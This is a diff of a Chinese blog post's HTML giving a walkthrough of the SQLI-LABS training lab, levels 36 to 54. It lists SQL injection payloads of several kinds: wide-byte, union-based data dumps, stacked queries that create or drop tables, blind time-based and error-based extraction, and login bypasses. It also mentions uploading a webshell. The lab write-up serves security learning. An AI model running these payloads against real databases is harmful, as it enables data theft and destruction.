@@ -1,1513 +1,442 @@
-<!DOCTYPE html>
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-
-<html class="theme-next gemini use-motion" lang="en">
-<head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
-<meta name="theme-color" content="#222"/>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2"/>
-
-<link rel="stylesheet" href="/css/main.css?v=6.7.0"/>
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.7.0">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.7.0">
-
-
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.7.0">
-
-
-  <link rel="mask-icon" href="/images/logo.svg?v=6.7.0" color="#222">
-
-
-
-
-
-
-
-<script id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Gemini',
-    version: '6.7.0',
-    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
-    fancybox: false,
-    fastclick: false,
-    lazyload: false,
-    tabs: true,
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
-  };
-</script>
-
-
-  
-
-
-
-
-  <meta name="description" content="接上篇">
-<meta name="keywords" content="SQL注入">
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/assets/avatar.jpg?v=2.1.1" type="image/png" sizes="16x16"><link rel="icon" href="/assets/avatar.jpg?v=2.1.1" type="image/png" sizes="32x32"><meta name="description" content="接上篇">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SQLI-LABS(Less36-Less65)">
 <meta property="og:url" content="http://chaosec.top/2018/03/05/sqli-labs3/index.html">
 <meta property="og:site_name" content="Aesm1p&#39; Blog">
 <meta property="og:description" content="接上篇">
-<meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-05-16T09:18:17.273Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="SQLI-LABS(Less36-Less65)">
-<meta name="twitter:description" content="接上篇">
-
-
-
-  <link rel="alternate" href="/atom.xml" title="Aesm1p' Blog" type="application/atom+xml"/>
-
-
-
-
-  <link rel="canonical" href="http://chaosec.top/2018/03/05/sqli-labs3/"/>
-
-
-
-<script id="page.configurations">
-  CONFIG.page = {
-    sidebar: "",
-  };
-</script>
-
-  <title>SQLI-LABS(Less36-Less65) | Aesm1p' Blog</title>
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  <noscript>
-  <style>
-  .use-motion .motion-element,
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-title { opacity: initial; }
-
-  .use-motion .logo,
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
-
-</head>
-
-<body itemscope itemtype="http://schema.org/WebPage" lang="en">
-
-  
-  
-    
-  
-
-  <div class="bg_content">
-    <canvas id="canvas"></canvas>
-  </div>
-
-  <div class="container sidebar-position-left page-post-detail">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta">
-    
-
-    <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Aesm1p' Blog</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-    
-      
-        <p class="site-subtitle">前方如聂鲁达的爱情诗一般美好</p>
-      
-    
-    
-  </div>
-
-  <div class="site-nav-toggle">
-    <button aria-label="Toggle navigation bar">
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
-  </div>
-</div>
-
-
-
-<nav class="site-nav">
-  
-    <ul id="menu" class="menu">
-      
-        
-        
-        
-          
-          <li class="menu-item menu-item-home">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br/>Home</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-about">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br/>About</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-soul">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/soul" rel="section"><i class="menu-item-icon fa fa-fw fa-book"></i> <br/>soul</a>
-
-  </li>
-
-      
-      
-        <li class="menu-item menu-item-search">
-          
-            <a href="javascript:;" class="popup-trigger">
-          
-            
-              <i class="menu-item-icon fa fa-search fa-fw"></i> <br/>Search</a>
-        </li>
-      
-    </ul>
-  
-
-  
-
-  
-    <div class="site-search">
-      
-  <div class="popup search-popup local-search-popup">
-  <div class="local-search-header clearfix">
-    <span class="search-icon">
-      <i class="fa fa-search"></i>
-    </span>
-    <span class="popup-btn-close">
-      <i class="fa fa-times-circle"></i>
-    </span>
-    <div class="local-search-input-wrapper">
-      <input autocomplete="off"
-             placeholder="Searching..." spellcheck="false"
-             type="text" id="local-search-input">
-    </div>
-  </div>
-  <div id="local-search-result"></div>
-</div>
-
-
-
-    </div>
-  
-</nav>
-
-
-
-  
-
-
-
-</div>
-    </header>
-
-    
-
-
-    <main id="main" class="main">
-
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-            
-
-          
-          <div id="content" class="content">
-            
-
-  <div id="posts" class="posts-expand">
-    
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://chaosec.top/2018/03/05/sqli-labs3/"/>
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Aesm1p"/>
-      <meta itemprop="description" content="相逢意气为君饮"/>
-      <meta itemprop="image" content="/images/avatar.jpg"/>
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Aesm1p' Blog"/>
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">SQLI-LABS(Less36-Less65)
-
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2018-03-05 21:41:22" itemprop="dateCreated datePublished" datetime="2018-03-05T21:41:22+08:00">2018-03-05</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2019-05-16 17:18:17" itemprop="dateModified" datetime="2019-05-16T17:18:17+08:00">2019-05-16</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/writeup/" itemprop="url" rel="index"><span itemprop="name">writeup</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-            <span class="post-meta-divider">|</span>
-            <span class="post-meta-item-icon"
-            >
-            <i class="fa fa-eye"></i>
-             Views:  
-            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
-            </span>
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        <p>接上篇</p>
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2018-03-05T13:41:22.000Z">
+<meta property="article:modified_time" content="2019-05-16T09:18:17.273Z">
+<meta property="article:author" content="Aesm1p">
+<meta property="article:tag" content="SQL注入">
+<meta name="twitter:card" content="summary"><title>SQLI-LABS(Less36-Less65) | Aesm1p' Blog</title><link ref="canonical" href="http://chaosec.top/2018/03/05/sqli-labs3/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.1.1"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: undefined,
+  header: {"enable":true,"showOnPost":false,"scrollDownIcon":true},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: true,
+  fancybox: true,
+  zoomImage: {"gapAside":"50px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 4.2.1"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner header-inner--height header-inner--bgcolor"><nav class="header-nav header-nav--sticky"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-address-card"></i></span><span class="header-nav-menu-item__text">About</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">Search</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">SQLI-LABS(Less36-Less65)</h1><div class="post-meta"><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2019-05-16</span></span><span class="post-meta-item post-meta-item--wordcount"><span class="post-meta-item__icon"><i class="far fa-file-word"></i></span><span class="post-meta-item__info">Words</span><span class="post-meta-item__value">1,810</span></span><span class="post-meta-item post-meta-item--readtime"><span class="post-meta-item__icon"><i class="far fa-clock"></i></span><span class="post-meta-item__info">Reading</span><span class="post-meta-item__value">14m</span></span></div></header><div class="post-body"><p>接上篇</p>
 <a id="more"></a>
-<h1 id="LESS-36"><a href="#LESS-36" class="headerlink" title="LESS-36"></a>LESS-36</h1><p>函数<code>mysql\_real\_escape\_string()</code>转义SQL语句中使用的字符串中的特殊字符。<br>下列字符受影响：</p>
+
+        <h1 id="LESS-36">
+          <a href="#LESS-36" class="heading-link"><i class="fas fa-link"></i></a>LESS-36</h1>
+      <p>函数<code>mysql\_real\_escape\_string()</code>转义SQL语句中使用的字符串中的特殊字符。<br>下列字符受影响：</p>
 <blockquote><p>\x00<br>\n<br>\r<br>\<br>‘<br>“<br>\x1a</p>
 </blockquote>
 <p>如果成功，则该函数返回被转义的字符串。如果失败，则返回false。</p>
 <p>可以使用宽字节注入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&apos; union select 1,database(),3--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1%df&#39; union select 1,database(),3--+</span><br></pre></td></tr></table></div></figure>
 <p>在使用<code>mysql_real_escape_string()</code>函数时，想要避免这种问题，需要将mysql设置为<code>gbk</code>即可</p>
-<h1 id="LESS-37"><a href="#LESS-37" class="headerlink" title="LESS-37"></a>LESS-37</h1><p>和34关绕过一样，waf和36关差不多</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin♦' or 1=1 limit 3,1#&amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+
+        <h1 id="LESS-37">
+          <a href="#LESS-37" class="heading-link"><i class="fas fa-link"></i></a>LESS-37</h1>
+      <p>和34关绕过一样，waf和36关差不多</p>
+<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin♦' or 1=1 limit 3,1<span class="comment">#&amp;passwd=admin&amp;submit=Submit</span></span><br></pre></td></tr></table></div></figure>
 <hr>
-<h1 id="堆叠注入stacked-injection"><a href="#堆叠注入stacked-injection" class="headerlink" title="堆叠注入stacked injection"></a><code>堆叠注入stacked injection</code></h1><p>所谓堆叠注入，就是指多条SQL语句同时执行，在命令行中每个SQL语句都是以<code>;</code>结尾。虽然说union语句也可以执行两条select语句，区别在于union语句可以执行的语句有限，而堆叠注入可以执行任何语句。比如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from pruducts where id=1;delete from products</span><br></pre></td></tr></table></figure></p>
+
+        <h1 id="堆叠注入stacked-injection">
+          <a href="#堆叠注入stacked-injection" class="heading-link"><i class="fas fa-link"></i></a>堆叠注入stacked injection</h1>
+      <p>所谓堆叠注入，就是指多条SQL语句同时执行，在命令行中每个SQL语句都是以<code>;</code>结尾。虽然说union语句也可以执行两条select语句，区别在于union语句可以执行的语句有限，而堆叠注入可以执行任何语句。比如<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from pruducts where id&#x3D;1;delete from products</span><br></pre></td></tr></table></div></figure></p>
 <p>堆叠注入的局限性在于并非每个环境都可以执行，受到环境的限制，</p>
 <hr>
-<h1 id="LESS-38"><a href="#LESS-38" class="headerlink" title="LESS-38"></a>LESS-38</h1><p>本题明注盲注皆可以，明注payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,group_concat(username),3 from users--+</span><br></pre></td></tr></table></figure></p>
-<p><strong>堆叠注入</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos;;create table test like users--+</span><br></pre></td></tr></table></figure></p>
-<p>可以看到数据库里面成功创建，然后再删除一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos;;drop table test--+</span><br></pre></td></tr></table></figure></p>
-<h1 id="LESS-39"><a href="#LESS-39" class="headerlink" title="LESS-39"></a>LESS-39</h1><p>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,2,3--+</span><br></pre></td></tr></table></figure></p>
+
+        <h1 id="LESS-38">
+          <a href="#LESS-38" class="heading-link"><i class="fas fa-link"></i></a>LESS-38</h1>
+      <p>本题明注盲注皆可以，明注payload<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,group_concat(username),3 from users--+</span><br></pre></td></tr></table></div></figure></p>
+<p><strong>堆叠注入</strong><br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39;;create table test like users--+</span><br></pre></td></tr></table></div></figure><br>可以看到数据库里面成功创建，然后再删除一下<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39;;drop table test--+</span><br></pre></td></tr></table></div></figure></p>
+
+        <h1 id="LESS-39">
+          <a href="#LESS-39" class="heading-link"><i class="fas fa-link"></i></a>LESS-39</h1>
+      <p>payload<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1 union select 1,2,3--+</span><br></pre></td></tr></table></div></figure></p>
 <p>也可堆叠注入</p>
-<h1 id="LESS-40"><a href="#LESS-40" class="headerlink" title="LESS-40"></a>LESS-40</h1><p>盲注payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=2&apos;) and ascii(substr(database(),1,1))=115--+</span><br></pre></td></tr></table></figure></p>
-<p>本题错误不回显，不能报错注入</p>
-<h1 id="LESS-41"><a href="#LESS-41" class="headerlink" title="LESS-41"></a>LESS-41</h1><p>和40关一样无法报错，可以和39关一样<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1;create table test like users--+</span><br></pre></td></tr></table></figure></p>
-<p>多条命令执行。也可以注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,2,database()--+</span><br></pre></td></tr></table></figure></p>
-<h1 id="LESS-42"><a href="#LESS-42" class="headerlink" title="LESS-42"></a>LESS-42</h1><p>本关mysqli_real_escape_string只过滤了username字段，对于password则没有过滤，payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=admin&amp;login_password=c&apos;;create table test like users#</span><br></pre></td></tr></table></figure></p>
-<h1 id="LESS-43"><a href="#LESS-43" class="headerlink" title="LESS-43"></a>LESS-43</h1><p>和42关一样，只是闭合方式不同<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=admin&amp;login_password=c&apos;) or 1=1#</span><br></pre></td></tr></table></figure></p>
-<h1 id="LESS-44"><a href="#LESS-44" class="headerlink" title="LESS-44"></a>LESS-44</h1><p>和42关一样，只是没有报错无法盲注<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=admin&amp;login_password=c&apos; or 1=1#</span><br></pre></td></tr></table></figure></p>
-<h1 id="LESS-45"><a href="#LESS-45" class="headerlink" title="LESS-45"></a>LESS-45</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user=admin&amp;login_password=c&apos;) or 1=1#</span><br></pre></td></tr></table></figure>
+
+        <h1 id="LESS-40">
+          <a href="#LESS-40" class="heading-link"><i class="fas fa-link"></i></a>LESS-40</h1>
+      <p>盲注payload<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;2&#39;) and ascii(substr(database(),1,1))&#x3D;115--+</span><br></pre></td></tr></table></div></figure><br>本题错误不回显，不能报错注入</p>
+
+        <h1 id="LESS-41">
+          <a href="#LESS-41" class="heading-link"><i class="fas fa-link"></i></a>LESS-41</h1>
+      <p>和40关一样无法报错，可以和39关一样<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1;create table test like users--+</span><br></pre></td></tr></table></div></figure><br>多条命令执行。也可以注入<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1 union select 1,2,database()--+</span><br></pre></td></tr></table></div></figure></p>
+
+        <h1 id="LESS-42">
+          <a href="#LESS-42" class="heading-link"><i class="fas fa-link"></i></a>LESS-42</h1>
+      <p>本关mysqli_real_escape_string只过滤了username字段，对于password则没有过滤，payload<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user&#x3D;admin&amp;login_password&#x3D;c&#39;;create table test like users#</span><br></pre></td></tr></table></div></figure></p>
+
+        <h1 id="LESS-43">
+          <a href="#LESS-43" class="heading-link"><i class="fas fa-link"></i></a>LESS-43</h1>
+      <p>和42关一样，只是闭合方式不同<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user&#x3D;admin&amp;login_password&#x3D;c&#39;) or 1&#x3D;1#</span><br></pre></td></tr></table></div></figure></p>
+
+        <h1 id="LESS-44">
+          <a href="#LESS-44" class="heading-link"><i class="fas fa-link"></i></a>LESS-44</h1>
+      <p>和42关一样，只是没有报错无法盲注<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user&#x3D;admin&amp;login_password&#x3D;c&#39; or 1&#x3D;1#</span><br></pre></td></tr></table></div></figure></p>
+
+        <h1 id="LESS-45">
+          <a href="#LESS-45" class="heading-link"><i class="fas fa-link"></i></a>LESS-45</h1>
+      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_user&#x3D;admin&amp;login_password&#x3D;c&#39;) or 1&#x3D;1#</span><br></pre></td></tr></table></div></figure>
 <p>注意：这几关页面都在login.php页面，不在原页面。</p>
-<h1 id="LESS-46"><a href="#LESS-46" class="headerlink" title="LESS-46"></a>LESS-46</h1><p>本关是<code>order by</code>注入，<br>尝试一下分号发现有报错，报错注入可以用一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=2 and extractvalue(1,concat(0x3c,(select database())))</span><br></pre></td></tr></table></figure></p>
-<p>看不到数据库名的话查看一下元素即可</p>
+
+        <h1 id="LESS-46">
+          <a href="#LESS-46" class="heading-link"><i class="fas fa-link"></i></a>LESS-46</h1>
+      <p>本关是<code>order by</code>注入，<br>尝试一下分号发现有报错，报错注入可以用一下<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort&#x3D;2 and extractvalue(1,concat(0x3c,(select database())))</span><br></pre></td></tr></table></div></figure><br>看不到数据库名的话查看一下元素即可</p>
 <p>对于这种问题有三种方法</p>
 <blockquote>
 <p>1、直接添加注入语句 <code>?sort=(select \*\*\*\*\*\*)</code><br>2、利用一些函数，例如rand函数，<code>?sort=rand(sql语句)</code>，而且此处rand(true)和rand(false)是不相同的。<br>3、利用and，例如<code>?sort=1 and (加sql语句)</code></p>
 </blockquote>
 <p>还可以执行infile等命令上传一句话木马</p>
-<h1 id="LESS-47"><a href="#LESS-47" class="headerlink" title="LESS-47"></a>LESS-47</h1><p>本关只是闭合方式发生了变化，只能进行报错和延时注入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?sort=1&apos; and extractvalue(1,concat(0x3c,(select database())))%23</span><br><span class="line">?sort=1 and if(1=1, sleep(1), null)</span><br><span class="line">?sort=1&apos; and (length(database())) = 8 and if(1=1, sleep(1), null)%23</span><br><span class="line">?sort=1&apos; and (ascii(substr((select database()) ,1,1))) = 115 and if(1=1, sleep(1), null)%23</span><br></pre></td></tr></table></figure>
-<h1 id="LESS-48"><a href="#LESS-48" class="headerlink" title="LESS-48"></a>LESS-48</h1><p>这关没有报错回显，延时盲注即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1 and (length(database())) = 8 and if(1=1, sleep(1), null)%23</span><br></pre></td></tr></table></figure></p>
-<h1 id="LESS-49"><a href="#LESS-49" class="headerlink" title="LESS-49"></a>LESS-49</h1><p>跟上关差不多只是闭合方式不同<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1&apos; and (length(database())) = 8 and if(1=1, sleep(1), null)%23</span><br></pre></td></tr></table></figure></p>
-<h1 id="LESS-50"><a href="#LESS-50" class="headerlink" title="LESS-50"></a>LESS-50</h1><p>考察order by的堆叠注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1;create table test like users;</span><br></pre></td></tr></table></figure></p>
-<h1 id="LESS-51"><a href="#LESS-51" class="headerlink" title="LESS-51"></a>LESS-51</h1><p>闭合方式不同<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1&apos;;create table test like users--+</span><br></pre></td></tr></table></figure></p>
-<h1 id="LESS-52"><a href="#LESS-52" class="headerlink" title="LESS-52"></a>LESS-52</h1><p>本题不报错，无法报错注入，依然可以堆叠注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1;create table test like users</span><br></pre></td></tr></table></figure></p>
-<h1 id="LESS-53"><a href="#LESS-53" class="headerlink" title="LESS-53"></a>LESS-53</h1><p>本关错误不能回显，但是可以和51关一样堆叠注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=1&apos;;create table test like users--+</span><br></pre></td></tr></table></figure></p>
-<h1 id="LESS-54"><a href="#LESS-54" class="headerlink" title="LESS-54"></a>LESS-54</h1><p>从本关开始进行更加进阶的注入，所用数据库也改为<code>challenges</code>，每个答案只能尝试10次，10次之后则会重置表名选项等信息。</p>
-<p>由于已经知道数据库名，所以可以直接开始爆表名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+</span><br></pre></td></tr></table></figure></p>
-<p>得到表名 <code>utj0xhedjp</code>(你的和我的不一样，是随机的)，接下来爆列名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;utj0xhedjp&apos;--+</span><br></pre></td></tr></table></figure></p>
-<p>得到<code>id,sessid,secret_W2TD,tryy</code>，得到字段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,secret_W2TD,3 from utj0xhedjp--+</span><br></pre></td></tr></table></figure></p>
-<p>得到<code>vYPh8AlkQMTlEGkZXRKWo1PT</code>，提交即可。</p>
